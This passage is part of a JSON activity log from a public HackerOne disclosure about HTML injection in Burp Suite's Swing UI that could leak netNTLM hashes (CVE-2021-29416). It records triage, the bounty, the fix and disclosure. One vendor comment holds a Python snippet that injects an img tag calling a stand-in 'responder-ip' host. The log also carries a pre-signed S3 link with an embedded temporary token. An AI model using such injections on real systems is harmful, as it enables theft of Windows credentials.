+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e6fe4q9yy9g0q8mhbmts3qi5gtrg?response-content-disposition=attachment%3B%20filename%3D%22burpsuite_leak_vuln-exchange.mp4%22%3B%20filename%2A%3DUTF-8%27%27burpsuite_leak_vuln-exchange.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071512Z&X-Amz-Expires=1661&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9d246aa37845868ec1a4e08406e4f5e84b334e864aea7505ef931f236bab3f55"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10145524,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2020-12-18T16:30:57.877Z",
+      "updated_at": "2020-12-18T16:30:57.877Z",
+      "additional_data": {
+        "old_severity": "Low",
+        "new_severity": "Medium",
+        "old_severity_id": 928761,
+        "new_severity_id": 936931
+      },
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10145545,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the update. We are classing this as medium severity, equivalent to `A website accessed through Burp Suite can retrieve local files from the user's system`. ",
+      "automated_response": false,
+      "created_at": "2020-12-18T16:33:59.922Z",
+      "updated_at": "2020-12-18T16:33:59.922Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10145788,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thanks to your excellent report, we've patched this specific bug and are actively developing a broader mitigation to prevent Java disclosing NTLM creds. We will be marking this issue as resolved and open to public disclosure as soon as the broader mitigation lands.",
+      "automated_response": false,
+      "created_at": "2020-12-18T16:55:21.762Z",
+      "updated_at": "2020-12-18T16:55:21.762Z",
+      "actor": {
+        "url": "/portswigger",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "PortSwigger Web Security"
+        }
+      },
+      "bounty_amount": "1000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "portswigger",
+      "collaborator": {
+        "username": "issuefinder",
+        "url": "/issuefinder"
+      }
+    },
+    {
+      "id": 10173260,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the bounty :)\n\nI also want to thank the following colleagues who helped me during the exploitation phase:\n- ipujol\n- interhack\n- revil\n- ri0t\n\nI will wait until the issue is marked as resolved and open to public disclosure to write a blog post.",
+      "automated_response": false,
+      "created_at": "2020-12-22T07:39:00.994Z",
+      "updated_at": "2020-12-22T07:39:00.994Z",
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10945674,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sorry for the delayed response. We released our broader mitigation one month ago in 2021.2. This should mean other occurrences of HTML injection can't be used for credential theft. For example, you can trigger HTML injection in Turbo Intruder with the following snippet, but this should be mostly harmless:\n\n```\ndef handleResponse(req, interesting):\n    req.label = '<html><img src=\"http://responder-ip\"/></img>'\n    table.add(req)\n```\n\nCan you confirm if this mitigation is working from your end?",
+      "automated_response": false,
+      "created_at": "2021-03-10T13:24:46.045Z",
+      "updated_at": "2021-03-10T13:24:46.045Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10983200,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yes, from my end both work fine (quick fix and broader mitigation).",
+      "automated_response": false,
+      "created_at": "2021-03-13T14:55:24.645Z",
+      "updated_at": "2021-03-13T14:55:24.645Z",
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 10984477,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Excellent, thanks for checking. Feel free to blog about this and/or request disclosure.",
+      "automated_response": false,
+      "created_at": "2021-03-13T19:59:23.306Z",
+      "updated_at": "2021-03-13T19:59:23.306Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "issuefinder",
+        "url": "/issuefinder"
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11157739,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "I would like to request public disclosure of this report and share my intention to request a CVE for this vulnerability.\n\nFor the CVE, do you prefer to request it by yourself? It appears that HackerOne provides this service: https://docs.hackerone.com/programs/cve-requests.html.\nIf not, do you want to share any information to add to the CVE request?",
+      "automated_response": false,
+      "created_at": "2021-03-28T19:37:52.395Z",
+      "updated_at": "2021-03-28T19:37:52.395Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11161997,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "I'll request the CVE",
+      "automated_response": false,
+      "created_at": "2021-03-29T09:27:47.846Z",
+      "updated_at": "2021-03-29T09:27:47.846Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11161999,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-29T09:27:47.979Z",
+      "updated_at": "2021-03-29T09:27:47.979Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11162274,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportTitleUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-29T09:41:03.506Z",
+      "updated_at": "2021-03-29T09:41:03.506Z",
+      "additional_data": {
+        "old_title": "Unsolicited hidden request made by Burp Suite can be used to leak real public IP address or netNTLM hash, get RCE on other machines or produce a DoS.",
+        "new_title": "HTML Injection in Swing can disclose netNTLM hash or cause DoS"
+      },
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11177119,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-30T07:32:51.808Z",
+      "updated_at": "2021-03-30T07:32:51.808Z",
+      "cve_ids": [
+        "CVE-2021-29416"
+      ],
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11177197,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Here's the CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29416",
+      "automated_response": false,
+      "created_at": "2021-03-30T07:33:55.262Z",
+      "updated_at": "2021-03-30T07:33:55.262Z",
+      "actor": {
+        "username": "albinowax",
+        "cleared": true,
+        "verified": true,
+        "url": "/albinowax",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    },
+    {
+      "id": 11187886,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks! I will share the blog post when it is published.",
+      "automated_response": false,
+      "created_at": "2021-03-30T19:14:43.939Z",
+      "updated_at": "2021-03-30T19:14:43.939Z",
+      "actor": {
+        "username": "issuefinder",
+        "cleared": false,
+        "verified": false,
+        "url": "/issuefinder",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "portswigger"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "id": 34390,
+      "category": "team",
+      "content": "@issuefinder found a vulnerability that could result in Burp Suite issuing requests that do not respect its upstream proxy configuration and could leak NetNTLM hashes on Windows systems that fail to block outbound SMB.\n\nThis was fixed in 2020.12, and additional hardening to prevent future injections being used to leak netNTLM hashes was introduced in 2021.2",
+      "user": {
+        "id": 56414,
+        "username": "albinowax",
+        "name": "James Kettle",
+        "bio": "@albinowax",
+        "cleared": true,
+        "verified": true,
+        "website": "https://skeletonscribe.net/",
+        "location": "United Kingdom",
+        "created_at": "2016-02-15T11:34:15.992Z",
+        "url": "https://hackerone.com/albinowax",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
